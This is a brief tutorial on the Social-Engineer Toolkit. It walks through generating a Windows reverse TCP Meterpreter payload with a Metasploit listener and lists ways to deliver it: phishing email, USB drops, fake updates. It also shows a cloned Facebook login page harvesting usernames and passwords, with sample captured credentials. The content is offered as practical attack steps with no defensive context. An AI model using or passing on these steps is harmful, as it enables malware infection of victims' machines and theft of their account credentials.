 Steps:
From main SET menu:
1) Social-Engineering Attacks
4) Create a Payload and Listener
Select Payload Type, e.g.:
1) Windows Reverse_TCP Meterpreter
Enter Payload Info:

LHOST: Your IP address (e.g., 192.168.1.100)
LPORT: Listening port (e.g., 4444)

Result:
SET generates a .exe payload file
A listener is started via Metasploit’s msfconsole

Distribute the payload:
Send via email (phishing)
USB drop
Embed in a fake update or document

👁️ Real-World Example: Clone Facebook + Harvest Password

sudo setoolkit
# → 1 → 2 → 3 → 2
Clone: https://facebook.com
Attacker IP: 192.168.1.100
Victim visits: http://192.168.1.100

Entered credentials show in terminal output:
[*] Username entered: testuser
[*] Password entered: testpass123
